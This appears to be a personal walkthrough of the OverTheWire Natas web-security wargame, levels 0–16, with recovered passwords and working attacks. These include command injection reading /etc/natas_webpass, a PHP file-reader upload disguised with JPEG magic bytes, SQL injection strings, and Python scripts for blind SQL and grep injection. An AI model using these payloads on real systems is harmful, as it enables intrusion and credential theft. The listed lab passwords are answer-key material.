OverTheWire - Natas

Natas 0:
- Inspecionar a pagina
- `Flag: gtVrDuiDfck831PqWsLEZy5gyDz1clto`

Natas 1:
- Inspecionar a pagina
- `Flag: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi`

Natas 2:
- Inspecinar pagina
- files/pixel.png
- http://natas2.natas.labs.overthewire.org/files/
- http://natas2.natas.labs.overthewire.org/files/users.txt

```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

Natas 3:
- Comentario:  No more information leaks!! Not even Google will find it this time...
- http://natas3.natas.labs.overthewire.org/robots.txt
- http://natas3.natas.labs.overthewire.org/s3cr3t/
- http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
- `natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`

Natas 4:
- Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/index.php" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
- Refazer a requisicao com `Referer: http://natas5.natas.labs.overthewire.org/`
- Flag: `iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`

Natas 5:
- Access disallowed. You are not logged in
- Inspecionando a requisicao tem loggedin=0
- alterando para 1
- Flag: `aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`

Natas 6:
- Sorce code contem: `include "includes/secret.inc";`
- `http://natas6.natas.labs.overthewire.org/includes/secret.inc`
- Payload:
```
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```
- Flag: `7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`


Natas 7:
-  hint: password for webuser natas8 is in /etc/natas_webpass/natas8
- `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`
- Flag: `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`


Natas 8:
- Source code tem: `bin2hex(strrev(base64_encode($secret)))`
- Entao fiz o reverso disso base64_dencode(strrev(hex2bin($secret)));
- Acho a senha `oubWYf2kBq`
- Flag: `W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`


Natas 9:
- No source cod tem : `passthru("grep -i $key dictionary.txt");`
- Lembrar da descricao 'All passwords are also stored in /etc/natas_webpass/'
- comando `; cat /etc/natas_webpass/natas10  ;`
- Flag: `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`

Natad 10:
- Comando `-E .* /etc/natas_webpass/natas11`
- `grep -i -E .* /etc/natas_webpass/natas11 dictionary.txt`
- Flag: `U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`


Natas 11:
- por ser uma cifra xor tem a seguinte propriedade
`A xor B = C` -> `A xor C = B`
- Assim vi que o criptograma
`ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=`
foi gerado por
`json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"))`
- Fazendo o criptograma xor o json tenho a seguinte chave
`qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq`
- Encriptando
`json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"))`
com a chave `qw8J` tenho o seguinte criptograma
`ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`
- Colocando esse criptograma no cookie temos
- Flag: `EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`


Natas 12
- Basta upar um codigo php para ler o arquivo com a flag
```
<?php
$fh = fopen('/etc/natas_webpass/natas13','r');
while ($line = fgets($fh)) {
  echo($line);
}
fclose($fh);
?>
```
- Para isso tem que editar a linha
`<input type="hidden" name="filename" value="f4z5i3idq7.jpg">`
para php
- Flag: `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`


Natas 13:
- Mesma coisa que o Natas 12
- Mas agora tem que dar bypass no `exif_imagetype`
essa funcao verifica os primeiros bytes do arquivo para saber se eh imagem
assim colocando os magic numbers antes do cod php ela acha que eh uma imagem
```
>>> f = open('shell.php', 'w')
>>> f.write('\xFF\xD8\xFF\xE0' + "<?php  $fh = fopen('/etc/natas_webpass/natas14','r'); while ($line = fgets($fh)) { echo($line); } fclose($fh); ?>")
>>> f.close()
```
- Flag: `Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`


Natas 14:
- SQLi
- login: `" or 1 = 1 #`  password: ""
- Flag: `AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`


Natas 15:
- blind sqli fiz bit a bit
- `https://www.exploit-db.com/papers/17073`
```
import requests


def check(response):
	if 'This user exists' in response:
		return True
	return False


url = "http://natas15.natas.labs.overthewire.org/index.php"

payload = "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n"
headers = {
    'content-type': "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
    'Authorization': "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="
    }



l = 1
flag = ''
verify = 'false'
while (check(verify) == False):
	letter = ''
	candidate = ''
	for i in range(6, -1, -1):
		candidate = letter + '0'
		sqli = "natas16\" and (ascii(substr(password,"+str(l)+",1)) >> "+str(i)+")="+ str(int(candidate,2))+"#"
		# print(sqli)
		# print(sqli)
		response = requests.request("POST", url, data=payload+sqli, headers=headers)
		# print(response.text)
		if check(response.text):
			letter += '0'
		else:
			letter += '1'

		print(letter)

	l+=1

	flag += chr(int(letter,2))
	print('Flag: ' + flag)
	sql = 'natas16\" and password = \"'+ flag
	response = requests.request("POST", url, data=payload+sql, headers=headers)
	verify=response.text
```
- Flag: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

Natas 16:
- É um blind injection num grep
- grep -i "<payload>" arquivo.txt
- como payload dou um grep no arquivo da senha do natas17
- ´$(grep -G^a /etc/natas_webpass/natas17)"´
- ´-G´ para buscar com expressao regex
- no exemplo se a letra a iniciar a senha do natas 17 ele vai buscar a senha no arquivo.txt
e nao vai responder nada se nao comecar ele vai dar grep com string vazia e responder todo 
o arquivo.txt, dessa aforma vou conseguindo fazer blind injection na senha
- usei ´[abcd]´ do regex para fazer busca binaria na string de possiveis letras da senha
´´´
import requests


def check(response):
    if 'African' in response:
        return False
    return True

def split(s):
    half, rem = divmod(len(s), 2)
    return s[:half + rem], s[half + rem:]

url = "http://natas16.natas.labs.overthewire.org/"


payload = ""
headers = {
    'Authorization': "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==",
    }






letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
password = ""


for i in range(32):
    l = letters
    while (True):
        f, s = split(l)

        needle = "African$(grep -G ^"+password+"["+f+"]"+" /etc/natas_webpass/natas17)" 
        querystring = {"needle":needle,"submit":"Search"}
        response = requests.request("GET", url, data=payload, headers=headers, params=querystring)

        if check(response.text):
            l = f
        else:
            l = s
        
        print(password+l)
        if len(l) == 1:
            password += l
            break

print(password)
´´´
- Flag: ´8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw´
